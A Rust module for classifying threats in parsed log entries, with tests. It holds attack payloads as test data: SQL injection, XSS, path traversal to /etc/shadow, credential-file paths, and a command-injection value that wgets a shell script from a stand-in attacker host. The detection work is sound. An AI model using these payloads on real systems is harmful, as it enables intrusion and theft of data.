//! Threat classification for parsed log entries.
//!
//! The `Classifier` inspects a `ParsedLogEntry` and produces a
//! `ThreatResult`: an ordered threat level, the categories that matched
//! (`SQLi`, XSS, path traversal, ...), and a confidence score.
//!
//! Detection is data-driven: every substring rule lives in
//! [`patterns::PATTERN_RULES`], so extending detection means appending a
//! row to that table, not writing a new check function. Two heuristics
//! that need the entry's level or status code (not just its text) remain
//! as small dedicated functions here.

pub mod patterns;

use std::fmt;

use crate::log_scanner::parser::{LogLevel, LogMetadata, ParsedLogEntry};

/// Severity of a threat, from harmless to worst case.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Default)]
pub enum ThreatLevel {
    #[default]
    None,
    Low,
    Medium,
    High,
    Critical,
}

impl fmt::Display for ThreatLevel {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            ThreatLevel::None => write!(f, "None"),
            ThreatLevel::Low => write!(f, "Low"),
            ThreatLevel::Medium => write!(f, "Medium"),
            ThreatLevel::High => write!(f, "High"),
            ThreatLevel::Critical => write!(f, "Critical"),
        }
    }
}

impl ThreatLevel {
    /// The lowercase name stored in `log_entries.threat_level`.
    #[must_use]
    pub fn as_str(self) -> &'static str {
        match self {
            ThreatLevel::None => "none",
            ThreatLevel::Low => "low",
            ThreatLevel::Medium => "medium",
            ThreatLevel::High => "high",
            ThreatLevel::Critical => "critical",
        }
    }

    /// Parse a stored level; unknown values map to [`ThreatLevel::None`].
    #[must_use]
    pub fn from_db(value: &str) -> Self {
        match value {
            "low" => ThreatLevel::Low,
            "medium" => ThreatLevel::Medium,
            "high" => ThreatLevel::High,
            "critical" => ThreatLevel::Critical,
            _ => ThreatLevel::None,
        }
    }
}

/// The kind of threat a log entry may indicate.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum ThreatCategory {
    SqlInjection,
    Xss,
    PathTraversal,
    CommandInjection,
    BruteForce,
    Scanner,
    SensitiveFile,
    TlsError,
    SuspiciousPattern,
}

impl fmt::Display for ThreatCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            ThreatCategory::SqlInjection => write!(f, "SqlInjection"),
            ThreatCategory::Xss => write!(f, "Xss"),
            ThreatCategory::PathTraversal => write!(f, "PathTraversal"),
            ThreatCategory::CommandInjection => write!(f, "CommandInjection"),
            ThreatCategory::BruteForce => write!(f, "BruteForce"),
            ThreatCategory::Scanner => write!(f, "Scanner"),
            ThreatCategory::SensitiveFile => write!(f, "SensitiveFile"),
            ThreatCategory::TlsError => write!(f, "TlsError"),
            ThreatCategory::SuspiciousPattern => write!(f, "SuspiciousPattern"),
        }
    }
}

impl ThreatCategory {
    /// The kebab-case name stored in `log_entries.threat_categories`.
    #[must_use]
    pub fn as_str(self) -> &'static str {
        match self {
            ThreatCategory::SqlInjection => "sql-injection",
            ThreatCategory::Xss => "xss",
            ThreatCategory::PathTraversal => "path-traversal",
            ThreatCategory::CommandInjection => "command-injection",
            ThreatCategory::BruteForce => "brute-force",
            ThreatCategory::Scanner => "scanner",
            ThreatCategory::SensitiveFile => "sensitive-file",
            ThreatCategory::TlsError => "tls-error",
            ThreatCategory::SuspiciousPattern => "suspicious-pattern",
        }
    }

    /// Severity tier implied by this category on its own.
    fn severity(self) -> ThreatLevel {
        match self {
            ThreatCategory::CommandInjection => ThreatLevel::Critical,
            ThreatCategory::SqlInjection
            | ThreatCategory::Xss
            | ThreatCategory::PathTraversal
            | ThreatCategory::Scanner => ThreatLevel::High,
            ThreatCategory::BruteForce | ThreatCategory::SensitiveFile => ThreatLevel::Medium,
            ThreatCategory::TlsError | ThreatCategory::SuspiciousPattern => ThreatLevel::Low,
        }
    }

    /// Categories that strongly indicate an active attack; their presence
    /// boosts the confidence score.
    fn is_strong(self) -> bool {
        matches!(
            self,
            ThreatCategory::CommandInjection
                | ThreatCategory::SqlInjection
                | ThreatCategory::Scanner
        )
    }
}

/// Outcome of classifying one log entry.
#[derive(Debug, Clone, PartialEq)]
pub struct ThreatResult {
    pub threat_level: ThreatLevel,
    pub categories: Vec<ThreatCategory>,
    pub confidence: f64,
}

impl fmt::Display for ThreatResult {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "{} threat (confidence: {:.0}%) - {}",
            self.threat_level,
            self.confidence * 100.0,
            self.categories
                .iter()
                .map(|c: &ThreatCategory| c.to_string())
                .collect::<Vec<_>>()
                .join(", ")
        )
    }
}

/// Stateless threat classifier.
#[derive(Debug, Clone, Default)]
pub struct Classifier {
    _private: (),
}

impl Classifier {
    #[must_use]
    pub fn new() -> Self {
        Self::default()
    }

    /// Classify an entry: run every pattern rule, apply the two
    /// level/status heuristics, then derive level and confidence.
    #[must_use]
    pub fn classify(&self, entry: &ParsedLogEntry) -> ThreatResult {
        let mut result = ThreatResult {
            threat_level: ThreatLevel::None,
            categories: Vec::new(),
            confidence: 0.0,
        };

        // All inputs are lowercased once; patterns are literal substrings.
        let text = format!("{} {}", entry.message, entry.raw).to_lowercase();
        let path = entry
            .metadata
            .request_path
            .as_ref()
            .map(|p| p.to_lowercase())
            .unwrap_or_default();
        let user_agent = entry.metadata.user_agent.as_ref().map(|u| u.to_lowercase());

        for rule in patterns::PATTERN_RULES {
            if rule.matches(&text, &path, user_agent.as_deref()) {
                add_category(&mut result, rule.category);
            }
        }

        check_brute_force_heuristic(&mut result, &text, entry);
        check_error_responses(&mut result, &entry.metadata, &path);

        if result.categories.is_empty() {
            return result;
        }

        result.confidence = calculate_confidence(&result);
        result.threat_level = calculate_threat_level(&result);
        result
    }
}

/// Add a category if it has not already been matched.
fn add_category(result: &mut ThreatResult, category: ThreatCategory) {
    if !result.categories.contains(&category) {
        result.categories.push(category);
    }
}

/// An error-level log line mentioning passwords is treated as credential
/// abuse even without a known brute-force phrase.
fn check_brute_force_heuristic(result: &mut ThreatResult, text: &str, entry: &ParsedLogEntry) {
    if entry.level == LogLevel::Error && text.contains("password") {
        add_category(result, ThreatCategory::BruteForce);
    }
}

/// 403/404 responses on admin-ish paths are classic reconnaissance.
fn check_error_responses(result: &mut ThreatResult, metadata: &LogMetadata, path: &str) {
    let Some(status) = metadata.status_code else {
        return;
    };

    if status == 403 || status == 404 {
        const SUSPICIOUS_PATHS: [&str; 8] = [
            "/admin",
            "/wp-admin",
            "/phpmyadmin",
            "/manager",
            "/console",
            "/config",
            "/.env",
            "/backup",
        ];

        if SUSPICIOUS_PATHS.iter().any(|sp| path.contains(sp)) {
            add_category(result, ThreatCategory::SuspiciousPattern);
        }
    }
}

/// Derive the overall level from the matched categories:
/// - `CommandInjection` alone is critical
/// - any High-tier category (plus a second category) is critical
/// - otherwise the highest tier present wins, with two or more
///   categories bumping to at least Medium
fn calculate_threat_level(result: &ThreatResult) -> ThreatLevel {
    let severities: Vec<ThreatLevel> = result
        .categories
        .iter()
        .copied()
        .map(ThreatCategory::severity)
        .collect();
    let has_critical = severities.contains(&ThreatLevel::Critical);
    let has_high = severities.iter().any(|l| *l >= ThreatLevel::High);
    // Only reached when nothing High/Critical matched, so ">= Medium"
    // here is exactly the Medium tier.
    let has_medium = severities.iter().any(|l| *l >= ThreatLevel::Medium);

    let category_count = result.categories.len();

    if has_critical || (has_high && category_count >= 2) {
        ThreatLevel::Critical
    } else if has_high {
        ThreatLevel::High
    } else if has_medium || category_count >= 2 {
        ThreatLevel::Medium
    } else if !result.categories.is_empty() {
        ThreatLevel::Low
    } else {
        ThreatLevel::None
    }
}

/// Confidence grows with the number of matched categories; strong attack
/// categories (command injection, `SQLi`, known scanners) add a bonus.
fn calculate_confidence(result: &ThreatResult) -> f64 {
    let base = match result.categories.len() {
        1 => 0.7_f64,
        2 => 0.85_f64,
        3..=4 => 0.95_f64,
        _ => 1.0_f64,
    };

    let has_strong = result
        .categories
        .iter()
        .copied()
        .any(ThreatCategory::is_strong);

    if has_strong {
        (base + 0.1_f64).min(1.0_f64)
    } else {
        base
    }
}
#[cfg(test)]
mod tests {
    use super::*;
    use crate::log_scanner::parser::{LogLevel, LogMetadata, ParsedLogEntry};
    use chrono::Utc;
    use rstest::rstest;
    use std::net::IpAddr;

    fn make_entry(message: &str, level: LogLevel, metadata: LogMetadata) -> ParsedLogEntry {
        ParsedLogEntry {
            timestamp: Utc::now(),
            source_name: "nginx".into(),
            level,
            message: message.into(),
            raw: message.into(),
            metadata,
        }
    }

    #[allow(dead_code)]
    fn make_entry_with_ip(message: &str, ip: IpAddr) -> ParsedLogEntry {
        make_entry(
            message,
            LogLevel::Info,
            LogMetadata {
                client_ip: Some(ip),
                ..LogMetadata::default()
            },
        )
    }

    fn make_entry_with_path(message: &str, path: &str) -> ParsedLogEntry {
        make_entry(
            message,
            LogLevel::Info,
            LogMetadata {
                request_path: Some(path.into()),
                ..LogMetadata::default()
            },
        )
    }

    fn make_entry_with_ua(message: &str, ua: &str) -> ParsedLogEntry {
        make_entry(
            message,
            LogLevel::Info,
            LogMetadata {
                user_agent: Some(ua.into()),
                ..LogMetadata::default()
            },
        )
    }

    fn make_entry_with_status(message: &str, status: u16) -> ParsedLogEntry {
        let path = message.split_whitespace().nth(1).unwrap_or(message);
        make_entry(
            message,
            LogLevel::Info,
            LogMetadata {
                request_path: Some(path.into()),
                status_code: Some(status),
                ..LogMetadata::default()
            },
        )
    }

    #[test]
    fn test_classifier_is_created() {
        let _classifier = Classifier::default();
        let _classifier_new = Classifier::new();
    }

    #[test]
    fn test_classify_normal_request() {
        let classifier = Classifier::new();
        let entry = make_entry(
            "GET /index.html 200",
            LogLevel::Info,
            LogMetadata::default(),
        );
        let result = classifier.classify(&entry);

        assert_eq!(result.threat_level, ThreatLevel::None);
        assert!(result.categories.is_empty());
    }

    #[test]
    fn test_classify_sql_injection_in_path() {
        let classifier = Classifier::new();

        let cases = vec![
            "/users?id=1' OR '1'='1",
            "/search?q=1; DROP TABLE users;--",
            "/api/users?id=1 UNION SELECT * FROM passwords",
            "/login?user=admin'--",
            "/page?id=1 AND 1=1",
            "/items?sort=name; EXEC xp_cmdshell('dir')",
        ];

        for path in cases {
            let entry = make_entry_with_path("GET request", path);
            let result = classifier.classify(&entry);
            assert!(
                result.threat_level >= ThreatLevel::High,
                "Expected high threat for SQL injection in path: {path}"
            );
            assert!(
                result.categories.contains(&ThreatCategory::SqlInjection),
                "Expected SqlInjection category for: {path}"
            );
        }
    }

    #[test]
    fn test_classify_xss_in_path() {
        let classifier = Classifier::new();

        let cases = vec![
            "/search?q=<script>alert('xss')</script>",
            "/comment?text=<img src=x onerror=alert(1)>",
            "/page?name=<svg onload=alert(1)>",
            "/input?value=javascript:alert(1)",
            "/form?data=<iframe src='evil.com'></iframe>",
        ];

        for path in cases {
            let entry = make_entry_with_path("GET request", path);
            let result = classifier.classify(&entry);
            assert!(
                result.threat_level >= ThreatLevel::High,
                "Expected high threat for XSS in path: {path}"
            );
            assert!(
                result.categories.contains(&ThreatCategory::Xss),
                "Expected Xss category for: {path}"
            );
        }
    }

    #[test]
    fn test_classify_path_traversal() {
        let classifier = Classifier::new();

        let cases = vec![
            "/files?name=../../../etc/passwd",
            "/download?file=....//....//etc/shadow",
            "/static/..%2f..%2f..%2fetc%2fpasswd",
            "/read?path=/etc/passwd",
            "/include?page=php://filter/convert.base64-encode/resource=config.php",
        ];

        for path in cases {
            let entry = make_entry_with_path("GET request", path);
            let result = classifier.classify(&entry);
            assert!(
                result.threat_level >= ThreatLevel::High,
                "Expected high threat for path traversal: {path}"
            );
            assert!(
                result.categories.contains(&ThreatCategory::PathTraversal),
                "Expected PathTraversal category for: {path}"
            );
        }
    }

    #[test]
    fn test_classify_suspicious_user_agents() {
        let classifier = Classifier::new();

        let cases = vec![
            ("sqlmap/1.5", ThreatLevel::High),
            ("nikto/2.1.6", ThreatLevel::High),
            ("nmap scripting engine", ThreatLevel::High),
            ("masscan/1.0", ThreatLevel::High),
            ("dirbuster/1.0", ThreatLevel::Medium),
            ("gobuster/3.1", ThreatLevel::Medium),
            ("WPScan v3.8", ThreatLevel::Medium),
        ];

        for (ua, expected_min) in cases {
            let entry = make_entry_with_ua("GET /", ua);
            let result = classifier.classify(&entry);
            assert!(
                result.threat_level >= expected_min,
                "Expected >= {expected_min:?} for UA: {ua}"
            );
            assert!(
                result.categories.contains(&ThreatCategory::Scanner),
                "Expected Scanner category for UA: {ua}"
            );
        }
    }

    #[test]
    fn test_classify_brute_force_indicators() {
        let classifier = Classifier::new();

        let cases = vec![
            (
                "Failed password for root from 192.168.1.100",
                LogLevel::Error,
            ),
            ("authentication failure; user=admin", LogLevel::Error),
            ("Invalid user hacker from 10.0.0.1", LogLevel::Warn),
            ("Maximum authentication attempts exceeded", LogLevel::Error),
        ];

        for (msg, level) in cases {
            let entry = make_entry(msg, level, LogMetadata::default());
            let result = classifier.classify(&entry);
            assert!(
                result.threat_level >= ThreatLevel::Medium,
                "Expected medium threat for brute force indicator: {msg}"
            );
            assert!(
                result.categories.contains(&ThreatCategory::BruteForce),
                "Expected BruteForce category for: {msg}"
            );
        }
    }

    #[test]
    fn test_classify_error_responses() {
        let classifier = Classifier::new();

        let entry = make_entry_with_status("GET /admin/config", 403);
        let result = classifier.classify(&entry);
        assert!(result.threat_level >= ThreatLevel::Low);

        let entry = make_entry_with_status("GET /wp-admin", 404);
        let result = classifier.classify(&entry);
        assert!(result.threat_level >= ThreatLevel::Low);
    }

    #[test]
    fn test_classify_combined_threats() {
        let classifier = Classifier::new();
        let entry = make_entry_with_ua("GET /users?id=1' OR '1'='1", "sqlmap/1.5");
        let result = classifier.classify(&entry);

        assert_eq!(result.threat_level, ThreatLevel::Critical);
        assert!(result.categories.contains(&ThreatCategory::SqlInjection));
        assert!(result.categories.contains(&ThreatCategory::Scanner));
        assert!(result.confidence > 0.8);
    }

    #[test]
    fn test_classify_command_injection() {
        let classifier = Classifier::new();

        let cases = vec![
            "/api/ping?host=127.0.0.1;cat /etc/passwd",
            "/exec?cmd=ls|grep secret",
            "/run?command=test`whoami`",
            "/api/curl?url=http://evil.com$(wget attacker.com/shell.sh)",
        ];

        for path in cases {
            let entry = make_entry_with_path("GET request", path);
            let result = classifier.classify(&entry);
            assert!(
                result.threat_level >= ThreatLevel::Critical,
                "Expected critical threat for command injection: {path}"
            );
            assert!(
                result
                    .categories
                    .contains(&ThreatCategory::CommandInjection),
                "Expected CommandInjection category for: {path}"
            );
        }
    }

    #[test]
    fn test_classify_sensitive_file_access() {
        let classifier = Classifier::new();

        let cases = vec![
            "/.env",
            "/.git/config",
            "/.htaccess",
            "/wp-config.php",
            "/config/database.yml",
            "/.aws/credentials",
        ];

        for path in cases {
            let entry = make_entry_with_path("GET request", path);
            let result = classifier.classify(&entry);
            assert!(
                result.threat_level >= ThreatLevel::Medium,
                "Expected medium threat for sensitive file access: {path}"
            );
            assert!(
                result.categories.contains(&ThreatCategory::SensitiveFile),
                "Expected SensitiveFile category for: {path}"
            );
        }

        // /etc/passwd and /proc/self/environ are classified as PathTraversal (more specific)
        for path in &["/etc/passwd", "/proc/self/environ"] {
            let entry = make_entry_with_path("GET request", path);
            let result = classifier.classify(&entry);
            assert!(
                result.threat_level >= ThreatLevel::High,
                "Expected high threat for system file access: {path}"
            );
            assert!(
                result.categories.contains(&ThreatCategory::PathTraversal),
                "Expected PathTraversal for system file: {path}"
            );
        }
    }

    #[test]
    fn test_classify_ssl_tls_errors() {
        let classifier = Classifier::new();

        let cases = vec![
            ("SSL_do_handshake() failed", LogLevel::Error),
            ("SSL_ERROR_RX_RECORD_TOO_LONG", LogLevel::Error),
            ("certificate verify failed", LogLevel::Error),
        ];

        for (msg, level) in cases {
            let entry = make_entry(msg, level, LogMetadata::default());
            let result = classifier.classify(&entry);
            assert!(result.threat_level >= ThreatLevel::Low);
        }
    }

    #[rstest]
    fn test_threat_level_ordering(
        #[values(
            ThreatLevel::None,
            ThreatLevel::Low,
            ThreatLevel::Medium,
            ThreatLevel::High,
            ThreatLevel::Critical
        )]
        a: ThreatLevel,
        #[values(
            ThreatLevel::None,
            ThreatLevel::Low,
            ThreatLevel::Medium,
            ThreatLevel::High,
            ThreatLevel::Critical
        )]
        b: ThreatLevel,
    ) {
        assert_eq!(a <= b, (a as u8) <= (b as u8));
    }

    #[test]
    fn test_threat_result_display() {
        let result = ThreatResult {
            threat_level: ThreatLevel::High,
            categories: vec![ThreatCategory::SqlInjection],
            confidence: 0.95,
        };
        let display = format!("{result}");
        assert!(display.contains("High"));
        assert!(display.contains("SqlInjection"));
    }

    /// Every row of the pattern table must actually detect its own
    /// category. If a rule is added to `patterns::PATTERN_RULES` and this
    /// test fails, the rule (or its scope) is wrong.
    #[test]
    fn test_every_pattern_rule_detects_its_category() {
        use patterns::{PATTERN_RULES, PatternScope};

        let classifier = Classifier::new();

        for rule in PATTERN_RULES {
            let in_text = matches!(rule.scope, PatternScope::Text | PatternScope::TextAndPath);
            let metadata = match rule.scope {
                PatternScope::UserAgent => LogMetadata {
                    user_agent: Some(rule.pattern.to_string()),
                    ..LogMetadata::default()
                },
                PatternScope::Path | PatternScope::PathPrefix => LogMetadata {
                    request_path: Some(rule.pattern.to_string()),
                    ..LogMetadata::default()
                },
                PatternScope::Text | PatternScope::TextAndPath => LogMetadata::default(),
            };
            let message = if in_text {
                rule.pattern.to_string()
            } else {
                "GET / 200".to_string()
            };
            let entry = make_entry(&message, LogLevel::Info, metadata);

            let result = classifier.classify(&entry);
            assert!(
                result.categories.contains(&rule.category),
                "pattern {:?} (scope {:?}) should be detected as {:?}",
                rule.pattern,
                rule.scope,
                rule.category
            );
        }
    }

    /// The classifier must be total (never panic) and deterministic on any
    /// input text, including binary garbage.
    #[cfg(test)]
    mod proptests {
        use super::*;
        use crate::log_scanner::parser::{LogMetadata, ParsedLogEntry};
        use chrono::Utc;
        use proptest::prelude::*;

        proptest! {
            #[test]
            fn classifier_is_total_and_deterministic(
                message in "[\\u{0}-\\u{ff}]{0,300}",
            ) {
                let entry = ParsedLogEntry {
                    timestamp: Utc::now(),
                    source_name: "proptest".into(),
                    level: LogLevel::Info,
                    message: message.clone(),
                    raw: message,
                    metadata: LogMetadata::default(),
                };
                let classifier = Classifier::new();
                let first = classifier.classify(&entry);
                let second = classifier.classify(&entry);
                prop_assert_eq!(first, second);
            }
        }
    }

    /// The DB round-trip (`as_str` → `from_db`) must be lossless for every
    /// level, and unknown stored values must fall back to `None`.
    #[test]
    fn test_threat_level_db_roundtrip() {
        for level in [
            ThreatLevel::None,
            ThreatLevel::Low,
            ThreatLevel::Medium,
            ThreatLevel::High,
            ThreatLevel::Critical,
        ] {
            assert_eq!(ThreatLevel::from_db(level.as_str()), level);
        }
        assert_eq!(ThreatLevel::from_db("bogus"), ThreatLevel::None);
        assert_eq!(ThreatLevel::from_db(""), ThreatLevel::None);
    }

    /// Every category name stored in the DB must be unique and stable.
    #[test]
    fn test_threat_category_as_str_is_unique() {
        let categories = [
            ThreatCategory::SqlInjection,
            ThreatCategory::Xss,
            ThreatCategory::PathTraversal,
            ThreatCategory::CommandInjection,
            ThreatCategory::BruteForce,
            ThreatCategory::Scanner,
            ThreatCategory::SensitiveFile,
            ThreatCategory::TlsError,
            ThreatCategory::SuspiciousPattern,
        ];
        let names: Vec<&str> = categories.iter().map(|c| c.as_str()).collect();
        let mut unique = names.clone();
        unique.sort_unstable();
        unique.dedup();
        assert_eq!(unique.len(), names.len(), "duplicate category names");
    }
}
